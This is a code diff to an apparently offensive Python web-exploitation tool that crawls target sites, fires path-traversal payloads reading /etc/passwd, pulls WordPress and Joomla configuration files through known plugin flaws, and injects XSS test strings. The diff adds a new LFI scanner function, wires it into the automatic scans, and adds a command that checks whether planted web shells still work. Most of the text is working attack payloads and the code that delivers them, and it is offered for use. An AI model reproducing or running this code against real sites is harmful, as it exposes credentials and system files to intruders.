@@ -34,8 +34,8 @@ now = datetime.datetime.now()
 year = now.strftime('%Y')
 month = now.strftime('%m')
 site = "www.fedsearch.xyz"
-Version = "1.2.8"
-timeout = 20
+Version = "1.2.9"
+timeout = 8
 
 
 HEADERS = {
@@ -151,28 +151,7 @@ dirs = [
     '/admin/uploads/shell.php',
     '/phpMyBackup',
     '/phpmybackup',
-    '/wp-content/uploads/private',
-    '/downloader.php?filename=../../../../../../etc/passwd',
-    '/download.php?filename=../../../../../../etc/passwd',
-    '/down.php?filename=../../../../../../etc/passwd',
-    '/download.php?file=../../../../../../etc/passwd',
-    '/downloader.php?file=../../../../../../etc/passwd',
-    '/downloads.php?file=../../../../../../etc/passwd',
-    '/down.php?file=../../../../../../etc/passwd',
-    '/download.php?file_name=../../../../../../etc/passwd',
-    '/downloader.php?file_name=../../../../../../etc/passwd',
-    '/down.php?file_name=../../../../../../etc/passwd',
-    '/index.php?file=../../../../../../etc/passwd',
-    '/admin/downloader.php?file=../../../../../../etc/passwd',
-    '/admin/libs/download.php?file=../../../../../../etc/passwd',
-    '/test.php?file=../../../../../../etc/passwd',
-    '/test.php?filename=../../../../../../etc/passwd',
-    '/lib/download.php?file_name=../../../../../../etc/passwd',
-    '/lib/downloader.php?file_name=../../../../../../etc/passwd',
-    '/lib/download.php?file=../../../../../../etc/passwd',
-    '/lib/download.php?name=../../../../../../etc/passwd',
-    '/download.php?name=../../../../../../etc/passwd'
-
+    '/wp-content/uploads/private'
 ]
 
 DowloadConfig = [
@@ -211,7 +190,28 @@ DowloadConfig = [
  '/wp-admin/admin.php?page=supsystic-backup&tab=bupLog&download=../wp-config.php',
  '/index.php?option=com_macgallery&view=download&albumid=../../configuration.php',
  '/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php',
- '/index.php?option=com_cckjseblod&task=download&file=configuration.php']
+ '/index.php?option=com_cckjseblod&task=download&file=configuration.php',
+ '/downloader.php?filename=../../../../../../etc/passwd',
+ '/download.php?filename=../../../../../../etc/passwd',
+ '/down.php?filename=../../../../../../etc/passwd',
+ '/download.php?file=../../../../../../etc/passwd',
+ '/downloader.php?file=../../../../../../etc/passwd',
+ '/downloads.php?file=../../../../../../etc/passwd',
+ '/down.php?file=../../../../../../etc/passwd',
+ '/download.php?file_name=../../../../../../etc/passwd',
+ '/downloader.php?file_name=../../../../../../etc/passwd',
+ '/down.php?file_name=../../../../../../etc/passwd',
+ '/index.php?file=../../../../../../etc/passwd',
+ '/admin/downloader.php?file=../../../../../../etc/passwd',
+ '/admin/libs/download.php?file=../../../../../../etc/passwd',
+ '/test.php?file=../../../../../../etc/passwd',
+ '/test.php?filename=../../../../../../etc/passwd',
+ '/lib/download.php?file_name=../../../../../../etc/passwd',
+ '/lib/downloader.php?file_name=../../../../../../etc/passwd',
+ '/lib/download.php?file=../../../../../../etc/passwd',
+ '/lib/download.php?name=../../../../../../etc/passwd',
+ '/download.php?name=../../../../../../etc/passwd'
+]
 
 
 
@@ -241,6 +241,13 @@ def config(url, path):
                     f.write(f"\nEnv RESULTS:\n{GetConfig.text}\n\n\n")
                 f.close()
                 print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Joomla config ={GREEN} Found {RESET} results saved to {GREEN}{filename}")
+            if "root:x" in GetConfig.text:
+                filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
+                with io.open(filename, "a+", encoding="utf-8") as f:
+                        #f.write(f"{GetConfig.url}\n\n") Sometimes it outputs weird shit LOL
+                    f.write(f"\nLFI RESULTS:\n{GetConfig.text}\n\n\n")
+                f.close()
+                print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}LFI config ={GREEN} Found {RESET} results saved to {GREEN}{filename}")
     except:
         #print(f"\n {PURPLE}[ {GREEN}? {PURPLE}]{RESET} Connection Timout\n")
         return
@@ -328,13 +335,7 @@ def dirsscan(url, path):
                     print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url} {RESET}| {YELLOW}phpMyBackup v.0.4 ")
                 if "Index of" in GetConfig.text:
                     print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found {GREEN}{GetConfig.url} {RESET}| {YELLOW}Open directory ")
-                if "root:x" in GetConfig.text:
-                    filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
-                    with io.open(filename, "a+", encoding="utf-8") as f:
-                        #f.write(f"{GetConfig.url}\n\n") Sometimes it outputs weird shit LOL
-                        f.write(f"\nLFI RESULTS:\n{GetConfig.text}\n\n\n")
-                    f.close()
-                    print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}LFI config ={GREEN} Found {RESET} results saved to {GREEN}{filename}")
+                
         
     except:
         #print(f"\n {PURPLE}[ {GREEN}? {PURPLE}]{RESET} Connection Timout\n")
@@ -771,7 +772,7 @@ def phpver(url):
     try:
         getvs = requests.get(url, timeout=timeout, headers=HEADERS).headers
         if "X-Powered-By" in getvs:
-            print(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}PHPVERSION {PURPLE}=> {GREEN}" + getvs['X-Powered-By'])
+            print(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Powered by {PURPLE}=> {GREEN}" + getvs['X-Powered-By'])
         if "Server" in getvs:
             print(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Server {PURPLE}=> {GREEN}" + getvs['Server'])
         if getvs['Server'] == "cloudflare":
@@ -1017,7 +1018,7 @@ def xss(site):
     ## LIL PRAM SPIDER
 
     filename = "Results/XSS.txt"
-    GetLink = requests.get(site, timeout=10, headers=HEADERS)
+    GetLink = requests.get(site, timeout=timeout, headers=HEADERS)
     urls = re.findall('href=[\\\'"]?([^\\\'" >]+)', str(GetLink.text).replace(site, ''))
     if len(urls) != 0:
         #print(urls)
@@ -1030,19 +1031,49 @@ def xss(site):
                     if "///" in urls:
                         pass
                     #print(url.replace('///', '/'))
-                    XSS = requests.get(url + '"><h1>Vulnnr</h1>', timeout=timeout, headers=HEADERS)
+                    XSS = requests.get(url + '><h1>Vulnnr</h1>', timeout=timeout, headers=HEADERS)
+                    if "404" in XSS.text:
+                        pass
+                    else:
+
+                        if 'Vulnnr' in XSS.text:
+                            
+                            with open(filename, "a+") as f:
+                                f.write(f"{url.replace('///', '/')}\n")
+                                    #f.write(test.text)
+                            f.close()
+                            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}XSS Scanner {PURPLE}=> {GREEN}{url.replace('///', '/')} {RESET}| {YELLOW}might be false ")
+            else:
+                return print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}XSS Scanner {PURPLE}=> {RED}None Found")
+                
+def LFI(site):
+    ## LIL PRAM SPIDER
+
+    filename = "Results/LFISCAN.txt"
+    GetLink = requests.get(site, timeout=timeout, headers=HEADERS)
+    urls = re.findall('href=[\\\'"]?([^\\\'" >]+)', str(GetLink.text).replace(site, ''))
+    if len(urls) != 0:
+        #print(urls)
+        prams = []
+        for url in urls:
+            if ".php?" in str(url):
+                prams.append(site + '/' + url)
+                
+                for url in prams:
+                    if "///" in urls:
+                        pass
+                    #print(url.replace('///', '/'))
+                    LFI = requests.get(url + '../../../../../etc/passwd', timeout=timeout, headers=HEADERS)
                    
-                    if '<h1>Vulnnr</h1>' in XSS.text:
+                    if 'root:x' in LFI.text:
                         
                         with open(filename, "a+") as f:
                             f.write(f"{url.replace('///', '/')}\n")
                                 #f.write(test.text)
                         f.close()
-                        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}XSS Scanner {PURPLE}=> {GREEN}{url.replace('///', '/')} {RESET}| {YELLOW}might be false ")
+                        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}LFI Scanner {PURPLE}=> {GREEN}{url.replace('///', '/')} {RESET}| {YELLOW}might be false ")
             else:
-                return print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}XSS Scanner {PURPLE}=> {RED}None Found")
-                
-
+                return print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}LFI Scanner {PURPLE}=> {RED}None Found")
 
 def Exploitt(site):
     try:
@@ -1409,6 +1440,7 @@ def auto(url):
             Exploit(url)
             print(f"\n {PURPLE}[ {GREEN}~ {RESET} Starting vulnscan! {GREEN}~{RESET} {PURPLE}]{RESET}")
             fileup(url)
+            LFI(site)
             simple(url)
             #wp_thumbnailSlider(url) Broken
             revslidercss(url)
@@ -1438,6 +1470,8 @@ def auto(url):
         elif "Joomla" in cms['name']:
             print(f"\n {PURPLE}[ {GREEN}~ {RESET} Starting Joomla Scan! {GREEN}~{RESET} {PURPLE}]{RESET}\n")
             com_gmap(url)
+            Exploit(url)
+            LFI(site)
             dirs2(url)
             Scriptegrator(url)
             com_cckjseblod(url)
@@ -1458,6 +1492,7 @@ def auto(url):
             dirs2(url)
             #print(f" {PURPLE}[ {GREEN}~ {RESET} Starting Dirscan! {GREEN}~{RESET} {PURPLE}]{RESET}")
             Exploit(url)
+            LFI(site)
             asistorage(url)
             gf(url)
             Exploitt(site)
@@ -1818,7 +1853,8 @@ def xhelp():
  {PURPLE}[ {GREEN}~ {PURPLE}] {RESET}others:\n
     {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}port {PURPLE}=> {RESET}Port Checker
     {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}domainscan {PURPLE}=> {RESET}Domain Scanner
-    {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}dirscan {PURPLE}=> {RESET}dirs Scanner
+    {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}dirscan {PURPLE}=> {RESET}Dirs Scanner
+    {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}shellcheck {PURPLE}=> {RESET}Checks if shells are working
     {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}portscanner {PURPLE}=> {RESET}Port Scanner
     """)
     return main()
@@ -1885,6 +1921,8 @@ def main():
         url = input(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Target {PURPLE}=> {RESET}")
         wp_plugin(url)
         return main()
+    elif userinput == "shellcheck":
+        os.system("python3 shellchecker.py")
     elif userinput == "dirscan":
         dirscan()
     elif userinput == "wpthemes":
